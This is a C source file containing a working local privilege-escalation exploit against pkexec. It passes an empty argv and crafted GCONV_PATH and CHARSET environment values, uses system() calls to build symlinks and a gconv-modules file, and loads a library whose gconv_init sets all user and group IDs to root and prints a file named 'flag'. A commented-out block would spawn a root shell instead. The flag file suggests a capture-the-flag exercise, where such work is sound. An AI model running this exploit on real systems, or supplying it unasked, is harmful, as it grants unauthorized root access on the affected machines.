#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <err.h>

int main() {
  char *const argv[] = {NULL};        // argc=0
  char *const envp[] = {"test/test",  // the path that contains '/'
        "PWD=GCONV_PATH=a",           // let g_find_program_in_path spit GCONV_PATH
        "CHARSET=x",                  // load
        "SHELL=asdf",                 // trigger g_printf -> iconv_open
        "GIO_USE_VFS=local",          // to avoid reallocation of env
        NULL};

  /* redirect back to pwd */
  system("ln -s $(pwd) 'GCONV_PATH=a'");
  system("mkdir -p test");
  system("cp -f x test/test");
  system("mkdir -p a/test/test/");

  /* gconv-modules to load x.so */
  system("/bin/echo -e 'module\\tUTF-8//\\tx//\\t../../../x\\t\\t2\n' > a/test/test/gconv-modules");

  if (execve("./pkexec", argv, envp) == -1) {
    err(1, "failed to launch pkexec");
  }
}

void gconv() { return; }

void gconv_init() {
  setuid(0); seteuid(0); setgid(0); setegid(0);

  /*
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {"PATH=/bin:/usr/bin:/sbin", NULL};
  execve(argv[0], argv, envp);
  */

  char buf[1024];
  FILE *fp = fopen("flag", "r");
  fread(buf, sizeof(buf), 1, fp);
  printf("%s", buf);
}
